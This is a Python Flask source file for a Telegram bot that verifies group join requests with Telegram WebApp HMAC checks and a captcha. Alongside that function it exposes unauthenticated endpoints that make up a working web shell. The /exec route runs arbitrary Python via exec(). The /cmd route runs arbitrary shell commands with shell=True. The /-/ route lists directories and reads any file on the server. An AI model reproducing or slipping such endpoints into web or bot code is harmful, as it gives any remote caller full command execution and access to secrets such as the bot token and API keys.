import sys
import os
import io
import subprocess
import shlex
import hashlib
import hmac
from flask import Flask, request, render_template
from flask.json import jsonify

import json
import urllib.request
import utils

#def app(event):
#    gs = repr(sys.path) 
#    return f"Hello, world!, {gs}\n{type(event)}<br />{dir(event)}<br />{event.type}<br>{event.body}"

if os.getenv('DETA_PATH') is None:
    # running in local for debug
    from dotenv import load_dotenv  # noqa
    load_dotenv()

TG_BOT_TOKEN = os.getenv('BOT_TOKEN')
TG_API = 'https://api.telegram.org/bot'

class TGBot:
    def __init__(self, token):
        self.api = TG_API + token
    
    def _post(self, api_name, payload):
        response_data = utils.post(self.api+'/'+api_name, payload)
        if not response_data['ok']:
            raise Exception(response_data['description']) 
        return response_data['result']
    
    def _get(self, api_name):
        response_data = utils.get(f'{self.api}/{api_name}')
        if not response_data['ok']:
            raise Exception(response_data['description']) 
        return response_data.get('result')

    def setup_webhook(self, webhook_url):
        webhookinfo = self._get('getwebhookinfo')
        if webhookinfo['url']:
            return
        self.set_webhook(webhook_url)

    def set_webhook(self, url):
        return self._post('setWebhook', {'url': url})

    def send_message(self, chat_id, text, **kwargs):
        return self._post('sendMessage', {'chat_id': chat_id, 'text': text, **kwargs})
    
    def approve_chat_join_request(self, chat_id, user_id):
        return self._post('approveChatJoinRequest', {'chat_id': chat_id, 'user_id': user_id})

    def delete_webhook(self):
        return self._get('deleteWebhook')


class WatchdogHandler:
    def __init__(self, bot):
        self._bot = bot

    def handle(self, update):
        if 'chat_join_request' in update:
            self.handle_chat_join_request(update['chat_join_request'])

    def handle_chat_join_request(self, chat_join_request):
        user_id = chat_join_request['from']['id']
        chat_id = chat_join_request['chat']['id']
        chat_title = chat_join_request['chat']['title']
        self._bot.send_message(
                user_id, 
                f'Welcom to join {chat_title}',
                reply_markup={
                  "inline_keyboard": [[{
                    "text": '开始验证',
                    "web_app": {
                        "url": f"https://{domain}/verify?chat_id={chat_id}"
                    }
                  }]]}
            )


def verify_user(data_check_str, hash_str):
    h1 = hmac.new("WebAppData".encode(), TG_BOT_TOKEN.encode(), hashlib.sha256)
    h2 = hmac.new(h1.digest(), data_check_str.encode(), hashlib.sha256)
    return h2.hexdigest() == hash_str


app = Flask(__name__, template_folder='.')
bot = TGBot(TG_BOT_TOKEN)
handler = WatchdogHandler(bot)

if TG_BOT_TOKEN:
    deta_path = os.getenv('DETA_PATH')
    domain = os.getenv('DOMAIN')
    if not deta_path and not domain:
        raise ValueError("seems like you are not running in deta, set a domain then.")
    if not domain:
        domain = deta_path + '.deta.dev'
    webhook_url = f'https://{domain}/{os.getenv("WEBHOOK", "webhook")}'
    bot.set_webhook(webhook_url)


@app.route('/'+os.getenv('WEBHOOK', 'webhook'), methods=['POST', 'GET'])
def tg_webhook_view():
    payload = request.json
    handler.handle(payload)
    if not payload:
        return 'empty request'
    return ''


@app.route('/verify', methods=['GET', 'POST'])
def verify_view():
    if request.method == 'GET':
        chat_id = request.args.get('chat_id')
        if not chat_id:
            return "invalid request"
        return render_template('verify.html', chat_id=chat_id, sitekey=os.getenv('FCAPSITEKEY'))
    data = request.json
    user_id = json.loads(data['user'])['id']
    hash_str = data.pop('hash')
    chat_id = data.pop('chat_id')
    solution = data.pop('solution')
    check_hash_str = '\n'.join(map(lambda item:f'{item[0]}={item[1]}', sorted(data.items())))
    valid_user = verify_user(check_hash_str, hash_str)
    valid_captcha = utils.verify_captcha(os.getenv('FCAPAPIKEY'), solution)
    if valid_user and valid_captcha:
        bot.approve_chat_join_request(chat_id, user_id)
    return {'ok': valid_user and valid_captcha}

@app.route('/')
def test():
    print(request.args)
    print(app.url_map)
    return render_template('exec.html')


@app.route('/exec', methods=['POST'])
def doexec():
    old = sys.stdout
    buf = io.StringIO()
    sys.stdout = buf
    cmd = request.data.decode()
    exec(cmd)
    sys.stdout = old
    return buf.getvalue()


@app.route('/-/')
@app.route('/-/<path:path>')
def index(path=None):
    if path is None:
        path = ''
    path = '/' + path
    if os.path.isdir(path):
        ret = os.listdir(path)
        if path.endswith('/'):
            path = path[:-1]
        print(path, type(path))
        return render_template('dir.html', root=path, dirs=ret)
    elif os.path.isfile(path):
        with open(path) as f:
            ret = f.read()
        return render_template('file.html', dir=os.path.dirname(path), content=ret)
    return ''


@app.route('/cmd', methods=['POST'])
def doit():
    cmd = request.data.decode()
    print(cmd)
    try:
        stdout = subprocess.check_output(shlex.split(cmd), shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify(traceback.format_exc())
    return jsonify(stdout)
